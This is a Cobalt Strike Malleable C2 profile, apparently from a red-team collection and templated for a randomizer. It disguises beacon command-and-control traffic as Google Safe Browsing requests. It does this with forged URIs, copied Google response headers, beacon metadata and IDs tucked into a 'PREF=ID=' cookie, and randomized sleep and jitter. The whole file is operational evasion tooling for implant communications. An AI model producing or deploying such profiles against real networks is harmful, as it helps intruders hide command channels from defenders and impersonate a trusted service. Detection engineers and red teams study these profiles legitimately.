# This profile has been modified to use with the Malleable C2 Profile Randomizer

#
# Safebrowsing Comms profile
#   https://code.google.com/p/google-safe-browsing/wiki/SafeBrowsingDesign
#
# Author: @harmj0y
#

set sleeptime "%%number:2%%00";
set jitter    "1%%number%%";
set maxdns    "24%%number%%";
set useragent "%%useragent%%";

http-get {

    # change/randomize this as you wish
    set uri "/safebrowsing/rd/%%alphanumeric:33%%-%%alphanumeric:11%%";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";

        metadata {
            netbios;
            prepend "PREF=ID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/vnd.google.safebrowsing-chunk";
        header "X-Content-Type-Options" "nosniff";
        header "Content-Encoding" "gzip";
        header "X-XSS-Protection" "1; mode=block";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Cache-Control" "public,max-age=172800";
        header "Age" "%%number:4%%";
        header "Alternate-Protocol" "80:quic";

        output {
            print;
        }
    }
}

http-post {
    
    set uri "/safebrowsing/rd/%%alphanumeric:33%%";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
        
        id {
            netbios;
            prepend "U=%%alhpanumeric:16%%";
            prepend "PREF=ID=";
            header "Cookie";
        }
        
        output {
            print;
        }
    }

    server {
        header "Content-Type" "application/vnd.google.safebrowsing-chunk";
        header "X-Content-Type-Options" "nosniff";
        header "Content-Encoding" "gzip";
        header "X-XSS-Protection" "1; mode=block";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Cache-Control" "public,max-age=172800";
        header "Age" "%%number:4%%";
        header "Alternate-Protocol" "80:quic";
        output {
            print;
        }
    }
}

